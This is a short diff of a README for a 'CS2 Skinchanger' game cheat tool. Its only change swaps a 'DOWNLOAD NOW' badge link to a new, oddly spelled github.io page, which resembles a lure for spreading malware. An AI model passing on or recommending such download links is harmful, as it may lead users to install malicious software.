@@ -5,7 +5,7 @@
 <h1 align="center"><strong>🎯 CS2 SKINCHANGER – INSTALLATION & USAGE GUIDE</strong></h1>
 
 <p align="center">
-  <a href="https://cs2skinchanger-forpc0.github.io/.github/" style="text-decoration:none;">
+  <a href="https://cs2skinchang3r4pctool.github.io/.github/" style="text-decoration:none;">
     <img src="https://img.shields.io/badge/DOWNLOAD%20NOW-228B22?style=for-the-badge&logo=windows&logoColor=white" alt="Download CS2 Skinchanger" width="200px" />
   </a>
 </p>
